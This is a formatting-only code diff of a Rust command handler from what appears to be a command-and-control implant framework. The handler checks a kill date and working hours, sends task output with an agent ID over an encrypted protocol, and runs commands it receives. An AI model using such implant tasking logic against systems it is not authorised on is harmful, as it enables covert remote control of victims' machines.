@@ -1,31 +1,30 @@
 use alloc::sync::Arc;
-
-use rs2_runtime::Runtime;
-
-use rs2_communication_protocol::communication_structs::agent_commands::AgentCommands;
-use rs2_communication_protocol::communication_structs::simple_agent_command::SimpleAgentCommand;
-use rs2_communication_protocol::communication_structs::task_output::TaskOutput;
-use rs2_communication_protocol::metadata::Metadata;
-use rs2_communication_protocol::protocol::Protocol;
-
-use mod_agentcore::instance;
-use mod_win32::nt_time::{check_kill_date, is_working_hours};
-
-use crate::command::filesystem::command_pwd;
-use crate::command::system::command_checkin;
-use crate::common::utils::{generate_path, generate_request_id};
-use crate::setup::communication::{encryptor_from_raw, protocol_from_raw};
-
+#[cfg(feature = "std-runtime")]
+use std::sync::mpsc;
 #[cfg(feature = "std-runtime")]
 use std::thread::{self, JoinHandle};
 
-#[cfg(feature = "std-runtime")]
-use std::sync::mpsc;
-
+use mod_agentcore::instance;
 #[cfg(feature = "nostd-nt-runtime")]
 use mod_nostd::{nostd_mpsc, nostd_thread};
+use mod_win32::nt_time::{check_kill_date, is_working_hours};
+use rs2_communication_protocol::{
+    communication_structs::{
+        agent_commands::AgentCommands,
+        simple_agent_command::SimpleAgentCommand,
+        task_output::TaskOutput,
+    },
+    metadata::Metadata,
+    protocol::Protocol,
+};
+use rs2_runtime::Runtime;
 
 use super::system::command_exit;
+use crate::{
+    command::{filesystem::command_pwd, system::command_checkin},
+    common::utils::{generate_path, generate_request_id},
+    setup::communication::{encryptor_from_raw, protocol_from_raw},
+};
 
 pub fn command_handler<R>(rt: Arc<R>)
 where
@@ -79,7 +78,7 @@ where
 
             // Create the metadata object, which contains request ID, command ID, and agent ID.
             let metadata = Metadata {
-                request_id: request_id,
+                request_id,
                 command_id: generate_request_id(32),
                 agent_id: instance().config.id.clone(),
                 path: Some(path),
@@ -89,8 +88,7 @@ where
 
             // Use the async runtime to send the `TaskOutput` through the protocol. The write operation is
             // performed asynchronously, and the result is awaited within a block.
-            let result =
-                rt.block_on(async { protocol_write.write(data, Some(encryptor.clone())).await });
+            let result = rt.block_on(async { protocol_write.write(data, Some(encryptor.clone())).await });
 
             if result.is_ok() {
                 // Read the list of commands from the protocol
@@ -116,11 +114,11 @@ where
                                 result_tx.send(result).unwrap();
                             });
                         }
-                    }
+                    },
                     Err(e) => {
                         // Handle error when reading tasks from protocol
                         eprintln!("Failed to read tasks: {:?}", e);
-                    }
+                    },
                 }
             }
         }
@@ -162,10 +160,7 @@ where
 }
 
 #[cfg(feature = "nostd-nt-runtime")]
-pub fn result_handler<R>(
-    rt: Arc<R>,
-    result_rx: nostd_mpsc::Receiver<TaskOutput>,
-) -> nostd_thread::NoStdThread
+pub fn result_handler<R>(rt: Arc<R>, result_rx: nostd_mpsc::Receiver<TaskOutput>) -> nostd_thread::NoStdThread
 where
     R: Runtime,
 {
